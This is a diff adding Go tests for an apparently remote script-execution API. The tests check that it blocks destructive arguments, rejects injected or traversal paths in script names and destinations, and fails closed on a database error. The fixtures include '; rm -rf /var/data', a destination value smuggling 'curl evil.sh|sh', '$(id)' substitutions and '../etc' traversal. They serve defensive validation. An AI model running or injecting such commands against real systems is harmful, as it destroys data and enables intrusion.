@@ -200,6 +200,124 @@ func TestExecCreate_ScriptWithDangerousArgsConfirmed(t *testing.T) {
 	require.NotEqual(t, http.StatusForbidden, w.Code)
 }
 
+func TestExecCreate_ScriptUnclosedQuoteArgsBlocked(t *testing.T) {
+	_, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	w := execPOST(t, r, map[string]interface{}{
+		"node_id":        "test-node",
+		"mode":           "script",
+		"script_content": "echo \"",
+		"script_args":    "; rm -rf /var/data",
+	})
+	require.Equal(t, http.StatusForbidden, w.Code)
+
+	var resp struct {
+		Blocked bool `json:"blocked"`
+		Matches []struct {
+			Node    string `json:"node"`
+			Pattern string `json:"pattern"`
+			Line    string `json:"line"`
+		} `json:"matches"`
+	}
+	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp))
+	require.True(t, resp.Blocked)
+	require.NotEmpty(t, resp.Matches)
+	assert.Equal(t, "test-node", resp.Matches[0].Node)
+	assert.Contains(t, resp.Matches[0].Line, "rm -rf")
+
+	w = execPOST(t, r, map[string]interface{}{
+		"node_id":          "test-node",
+		"mode":             "script",
+		"script_content":   "echo \"",
+		"script_args":      "; rm -rf /var/data",
+		"danger_confirmed": true,
+	})
+	require.NotEqual(t, http.StatusForbidden, w.Code)
+}
+
+func TestExecCreate_ScriptSafeContentAndArgsNotBlocked(t *testing.T) {
+	_, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	w := execPOST(t, r, map[string]interface{}{
+		"node_id":        "test-node",
+		"mode":           "script",
+		"script_content": "echo rm",
+		"script_args":    "-rf /data",
+	})
+	require.NotEqual(t, http.StatusForbidden, w.Code)
+	assert.Equal(t, http.StatusAccepted, w.Code)
+}
+
+func TestExecCreate_DangerousScriptDestRejected(t *testing.T) {
+	_, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	for _, dest := range []string{
+		"/tmp;curl evil.sh|sh;x",
+		"/tmp|evil",
+		"/tmp/$(id)",
+		"/tmp && touch /pwned",
+		"relative/path",
+		"/tmp/../etc",
+	} {
+		w := execPOST(t, r, map[string]interface{}{
+			"node_id":        "test-node",
+			"mode":           "script",
+			"script_content": "echo hi",
+			"script_dest":    dest,
+		})
+		require.Equal(t, http.StatusBadRequest, w.Code, "dest=%q", dest)
+		assert.Contains(t, w.Body.String(), "script_dest")
+	}
+}
+
+func TestExecCreate_DangerousScriptNameRejected(t *testing.T) {
+	_, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	for _, name := range []string{"a;id.sh", "a|id.sh", "a$(id).sh", "../../../etc/x.sh", ".."} {
+		w := execPOST(t, r, map[string]interface{}{
+			"node_id":        "test-node",
+			"mode":           "script",
+			"script_content": "echo hi",
+			"script_name":    name,
+		})
+		require.Equal(t, http.StatusBadRequest, w.Code, "name=%q", name)
+	}
+}
+
+func TestExecCreate_ValidScriptDestAllowed(t *testing.T) {
+	_, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	w := execPOST(t, r, map[string]interface{}{
+		"node_id":        "test-node",
+		"mode":           "script",
+		"script_content": "echo hi",
+		"script_name":    "deploy.sh",
+		"script_dest":    "/opt/scripts",
+	})
+	require.Equal(t, http.StatusAccepted, w.Code)
+}
+
+func TestExecCreate_NodeUserScanErrorFailsClosed(t *testing.T) {
+	db, h := execTestSetup(t)
+	r := execRBACRouter(t, h)
+
+	_, err := db.Exec(`INSERT INTO nodes (id, name, address, port, user, status) VALUES
+		('null-user-node', 'null-user-node', '127.0.0.1', 22, NULL, 'online')`)
+	require.NoError(t, err)
+
+	w := execPOST(t, r, map[string]interface{}{
+		"node_id": "test-node",
+		"command": "uptime",
+	})
+	require.Equal(t, http.StatusInternalServerError, w.Code)
+	assert.Contains(t, w.Body.String(), "query node users failed")
+}
+
 type recordingExecutor struct {
 	called int
 }
